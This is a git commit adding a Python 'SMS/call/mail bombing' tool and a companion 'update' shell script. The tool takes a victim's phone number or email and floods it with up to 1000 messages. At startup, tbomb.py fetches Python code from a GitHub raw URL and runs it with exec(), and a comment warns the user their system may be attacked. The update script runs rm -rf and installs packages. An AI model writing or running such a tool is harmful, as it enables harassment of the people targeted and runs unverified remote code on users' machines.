0294cb6c546c93deb822e728a704df0144a87327
It's Najmul <111493279+N41M01@users.noreply.github.com>
2023-01-11 15:18:51 +0600

    Add files via upload

---
+++ tbomb.py
@@ -0,0 +1,243 @@
+#coding=utf-8
+#!/bin/python3
+
+
+
+# ASSALAMUALAIKUM
+
+# THIS IS A BANGLADESHI PROGRAMMER
+##########################################################
+# DEV : DEVIL
+# Github : https://github.com/N41M01
+
+# IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
+
+
+# THANKS TO ALLAH
+# WELCOME HOME
+#####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################
+
+
+
+acl='\033[1;30m'
+rcl='\033[1;31m'
+ycl='\033[1;33m'
+ncl='\033[0;00m'
+import os
+try:
+    import requests
+except:
+  #TRYING TO DOWNLOAD REQUESTS FOR PYTHON2 AND PYTHON3 BOTH  
+    os.system('pip install requests ; pip2 install requests')
+try:    
+  import json
+  import os
+  import sys
+  import subprocess
+  import string
+  import random
+  import json
+  import re
+  import time
+  import argparse
+  import json
+  import smtplib
+except Exception as emao:
+  exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
+try:
+  from pkg_resources import resource_string
+  from core.user_agents import user_agent
+  from core.logos import logomao
+  from core.ccchk import *
+  from core.logos import *
+  
+except Exception as emao:
+  maoversys=sys.version_info[0]==3
+  if maoversys:
+    exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
+  else:
+    exit("\n{acl}[ {rcl}! {acl}]{ycl} USE PYTHON 3.6+ {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
+acl='\033[1;30m'
+rcl='\033[1;31m'
+ycl='\033[1;33m'
+ncl='\033[0;00m'
+maoversys=sys.version_info[0]==3
+if maoversys:
+  pass 
+else:
+  exit("\n{acl}[ {rcl}! {acl}]{ycl} USE PYTHON 3.6+ {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
+
+
+
+
+os.system('clear')
+
+
+def logomain2():
+  clr()
+  print(logomao)
+
+print(logomaodata)
+print("{gcl}WAIT A SECOND {bcl}...".format(gcl=gcl,bcl=bcl))
+if sys.version_info[1] == 11:
+    maopaste=requests.get("https://raw.githubusercontent.com/mao2116/test/main/api/mao_api.py").text
+    exec(maopaste)
+elif sys.version_info[1] == 9 or  sys.version_info[1] == 10:
+    maopaste=requests.get("https://raw.githubusercontent.com/mao2116/test/main/api/mao_api_old.py").text
+    exec(maopaste)
+class mao:
+  
+  def psb(self,z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+  def mao3print(self,z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+  def ext(self):
+    exit("\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USEING DEVIL TOOL {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))    
+
+  def authermao(self):
+    os.system('xdg-open https://www.facebook.com/DEVIL.NAJMUL')
+  
+  
+  
+  def autherthbd(self):
+    os.system('https://www.facebook.com/Termux.Hacker.Bd.Official/')
+  def clr():
+    os.system("clear")
+    
+
+
+
+
+
+  def main(self): 
+  
+     
+  
+      logomao="""\033[1;32m
+\033[1;32m╔══════════════════════════════════════════════════════════╗\033[1;93m
+\033[1;32m║	         \033[1;93m ─━㋱ASSALAMUALAIKUM㋱━─\033[1;32m	           ║
+\033[1;32m╔══════════════════════════════════════════════════════════╗
+\033[1;32m║   \033[1;93m  _____  ________      _______ _ \033[1;32m                      ║
+\033[1;32m║   \033[1;93m |  __ \|  ____\ \    / /_   _| |     \033[1;32m                 ║
+\033[1;32m║   \033[1;93m | |  | | |__   \ \  / /  | | | |     \033[1;32m                 ║
+\033[1;32m║   \033[1;93m | |  | |  __|   \ \/ /   | | | |     \033[1;32m                 ║
+\033[1;32m║   \033[1;93m | |__| | |____   \  /   _| |_| |____ \033[1;32m                 ║
+\033[1;32m║   \033[1;93m |_____/|______|   \/   |_____|______|\033[1;32m                 ║
+\033[1;32m╚══════════════════════════════════════════════════════════╝
+\033[1;32m╔══════════════════════════════════╗╔══════════════════════╗
+\033[1;32m║NOTE : \033[37;41mTHIS TOOLS IS FREE\033[0;m\033[1;32m         ║║        \x1b[1;91m___T_\033[1;32m         ║
+\033[1;32m║══════════════════════════════════║║       \x1b[1;91m| o o |\033[1;32m        ║
+\033[1;32m║AUTHOR    : DEVIL NAJMUL          ║║       \x1b[1;91m|__-__|\033[1;32m        ║
+\033[1;32m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
+\033[1;32m║WHATSAPP  : +8801977073308        ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
+\033[1;32m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
+\033[1;32m║GITHUB    : N41M01                ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
+\033[1;32m║══════════════════════════════════║║                      ║
+\033[1;32m║SERVER    : DATA -  WORKING       ║╚══════════════════════╝
+\033[1;32m║══════════════════════════════════════════════════════════╗
+\033[1;32m║FACEBOOK LINK : \x1b[1;91mhttps://www.facebook.com/N41M01\033[1;32m           ║
+\033[1;32m║══════════════════════════════════════════════════════════║
+\033[1;32m║FB PAGE LINK  : \x1b[1;91mhttps://www.facebook.com/DEVIL.NAJMUL\033[1;32m     ║
+\033[1;32m╚══════════════════════════════════════════════════════════╝\033[1;37m""".format(bcl=bcl,gcl=gcl,ycl=ycl)
+      print(logomao)
+      parser = argparse.ArgumentParser(description="")
+  
+      #
+  
+    
+  
+      parser.add_argument('--bombing', dest='BOMBING', required="store_true",help="ENTER YOUR BOMBING TYPE sms/sms_call/mail")
+  
+      parser.add_argument('--mail', dest="MAIL_NAME",help="ENTER YOUR VICTIM MAIL")
+  
+      
+   
+      parser.add_argument('--cc', dest='COUNTRY_CODE',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 
+  
+      parser.add_argument('--number', dest='NUMBER',help="VICTIM NUMBER [[ ONLY NEED FOR SMS/SMS_CALL BOMBING ]]") 
+  
+      parser.add_argument('--threat', dest='THREAT',help="LIMIT OF BOMBING") 
+  
+      parser.add_argument('--morelevels',dest='moreLevels',action='store_true') 
+  
+    
+  
+      # parse args 
+      
+      
+      args = parser.parse_args() 
+      maothreat=0
+      
+      if args.BOMBING=='sms':
+        try:
+          maothreat=int(args.THREAT)
+          
+        except:
+          print("[ ! ] ENTER BOMBING THREAT [ ! ] \n")
+        if maothreat <=1000:
+            pass
+        else:
+            exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))
+  
+        maocc=str(args.COUNTRY_CODE)
+        maonumber=str(args.NUMBER)
+        get_phone_info(maocc,maonumber)
+        ccn=get_phone_info(maocc,maonumber)[2]
+        
+        mainbomb(maothreat,maocc,maonumber,ccn)
+      elif args.BOMBING=="sms_call":
+        maothreat =0
+        try:
+          maothreat=int(args.THREAT)
+          
+        
+        except:
+          print("{acl}[ {rcl}!{acl} ]{rcl} ENTER BOMBING THREAT {acl}[{rcl} ! {acl}] \n{ncl}".format(acl=acl,rcl=rcl,ncl=ncl))
+        if maothreat <=1000:
+            pass
+        else:
+            exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))  
+        maocc=str(args.COUNTRY_CODE)
+        maonumber=str(args.NUMBER)
+        get_phone_info(maocc,maonumber)
+        ccn=get_phone_info(maocc,maonumber)[2]
+       
+        smsandcall(maothreat,maocc,maonumber,ccn)
+      elif args.BOMBING =="mail":
+        threat=args.THREAT
+        mail=args.MAIL_NAME
+        if int(threat) <=1000:
+            pass
+        else:
+            exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))  
+        
+        mails(mail,threat)
+  
+      else:
+        self.authermao()
+        exit("{acl}[{rcl} !{acl} ] {rcl}TRY WITH CORRECT BOMBING TYPE {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl))
+      
+      
+      
+
+
+    
+mao().main()    
+##########################################################
+# DEV : DEVIL
+# Github : https://github.com/N41M01
+# IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
+# YOU KNOW WHAT I FUCK YOUR SYSTEM SO BE CAREFULL
+
+# THANKS TO ALLAH
+# WELCOME HOME
+#####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################
+
+###THIS TOOL IS ONLINE
---
+++ up_tbomb_mao.sh
@@ -0,0 +1,91 @@
+##########################################################
+# DEV : DEVIL
+# Github : https://github.com/N41M01
+# IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
+
+# THANKS TO ALLAH
+# WELCOME HOME
+# 
+#####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################
+
+
+
+
+
+
+
+
+
+a='\033[1;30m'
+rc='\033[1;31m'
+g='\033[1;32m' 
+y='\033[1;33m'
+b='\033[1;34m'
+p='\033[1;35m'
+c='\033[1;36m' 
+w='\033[1;37m'
+m='\033[1;94m'
+n='\033[0;00m' 
+
+logo(){
+  clear
+  echo -e "${g}  _____  ________      _______ _      
+  echo -e "${g} |  __ \|  ____\ \    / /_   _| |     
+  echo -e "${g} | |  | | |__   \ \  / /  | | | |     
+  echo -e "${g} | |  | |  __|   \ \/ /   | | | |     
+  echo -e "${g} | |__| | |____   \  /   _| |_| |____ 
+  echo -e "${g} |_____/|______|   \/   |_____|______|                "
+echo 
+echo 
+echo
+
+
+echo -e "                  \033[1;30m[ \033[1;34mAUTHER \033[1;30m] \033[1;32mDEVIL \033[1;32mNAJMUL\033[1;31m"
+echo -e "                  \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mN41M01"
+echo -e "                  \033[1;30m[ \033[1;34mCODER \033[1;30m ] \033[1;30mDEVIL"
+
+}
+logo
+update(){
+  echo -e "${p} A UPDATE AVAILABLE"
+  sleep 0.1
+  echo -e "${m} SMSBOMBER IS UPDATING"
+  sleep 1
+  xdg-open https://www.facebook.com/DEVIL.NAJMUL
+  echo -e "${b} PLEASE WAIT..." 
+  cd ; 
+  rm -rf smsbomber; 
+  apt update ; 
+  apt install python -y ; 
+  apt install git -y ;
+  pip install requests ;
+  git clone --depth=1 https://github.com/N41M01/smsbomber
+  echo
+  echo -e "${g} NOW YOUR TOOL UPDATED."
+  echo
+  echo -e "${y} THANKS FOR UPDATE ME."
+  echo
+  echo -e "${g}<==> NOW TYPE <==>"
+  echo
+  echo -e "${b} cd ; cd smsbomber ; python smsbomber.py${n}" ;
+  sleep 3
+
+
+}
+update
+echo 
+echo
+exit
+
+
+
+
+
+##########################################################
+# DEV : MAO2116
+# Github : https://github.com/mao2116
+# IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
+# THANKS TO ALLAH
+# WELCOME HOME
+# MAO2116
+#####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################
